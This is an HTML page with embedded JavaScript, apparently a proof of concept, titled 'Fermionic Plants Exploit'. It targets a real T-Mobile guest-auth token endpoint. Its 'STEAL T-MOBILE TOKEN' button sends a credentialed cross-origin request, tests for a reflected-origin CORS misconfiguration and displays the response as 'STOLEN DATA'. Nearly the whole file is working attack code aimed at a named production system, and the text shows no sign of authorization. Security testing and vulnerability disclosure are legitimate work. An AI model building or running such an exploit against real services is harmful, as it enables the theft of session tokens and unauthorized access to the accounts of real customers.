<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fermionic Plants - Exploit</title>
    <style>
        body { font-family: sans-serif; background: #0b0e11; color: white; padding: 50px; text-align: center; }
        .box { background: #1c2128; border: 2px solid #444c56; border-radius: 15px; padding: 40px; max-width: 700px; margin: auto; }
        
        /* THE STEAL BUTTON */
        #steal-btn { 
            background: #e20074; 
            color: white; 
            border: none; 
            padding: 30px 60px; 
            font-size: 24px; 
            font-weight: bold; 
            border-radius: 10px; 
            cursor: pointer; 
            box-shadow: 0 0 20px rgba(226, 0, 116, 0.5);
            text-transform: uppercase;
        }
        #steal-btn:hover { background: #ff0084; transform: scale(1.02); }
        
        #result-log { 
            margin-top: 30px; 
            background: #0d1117; 
            border: 1px solid #30363d; 
            padding: 20px; 
            text-align: left; 
            font-family: monospace; 
            min-height: 150px; 
            word-break: break-all;
            white-space: pre-wrap;
        }
        .success { color: #39d353; font-weight: bold; }
        .error { color: #f85149; }
    </style>
</head>
<body>

    <div class="box">
        <h1 style="color: #e20074;">Fermionic Plants Exploit</h1>
        <p>Target: <code>https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens</code></p>
        
        <br>
        <button id="steal-btn" onclick="executeExploit()">STEAL T-MOBILE TOKEN</button>
        <br>

        <div id="result-log">Waiting for user interaction...</div>
    </div>

<script>
    async function executeExploit() {
        const url = "https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
        const log = document.getElementById('result-log');
        
        log.innerHTML = "[*] Requesting data with credentials...\n";

        try {
            const response = await fetch(url, {
                method: 'POST',
                mode: 'cors',
                credentials: 'include', // Attempts to grab the session cookies
                headers: {
                    'Content-Type': 'application/json',
                    'applicationid': 'POC-TEST'
                },
                body: JSON.stringify({})
            });

            const acao = response.headers.get('Access-Control-Allow-Origin');
            const acac = response.headers.get('Access-Control-Allow-Credentials');
            const text = await response.text();

            log.innerHTML += `[+] Status: ${response.status}\n`;
            log.innerHTML += `[+] Access-Control-Allow-Origin: ${acao}\n`;
            log.innerHTML += `[+] Access-Control-Allow-Credentials: ${acac}\n\n`;

            if (acao && acac === "true") {
                log.innerHTML += `<span class="success">[!!!] VULNERABILITY CONFIRMED [!!!]</span>\n`;
                log.innerHTML += `STOLEN DATA: ${text}`;
            } else {
                log.innerHTML += `<span class="error">[-] FAILED: Origin was not reflected with credentials.</span>`;
            }

        } catch (err) {
            log.innerHTML += `<span class="error">[!] ERROR: ${err.message}</span>\n\n`;
            log.innerHTML += `The browser blocked the read. This happens if the server rejected your specific Origin during the Preflight (OPTIONS) check.`;
        }
    }
</script>

</body>
</html>
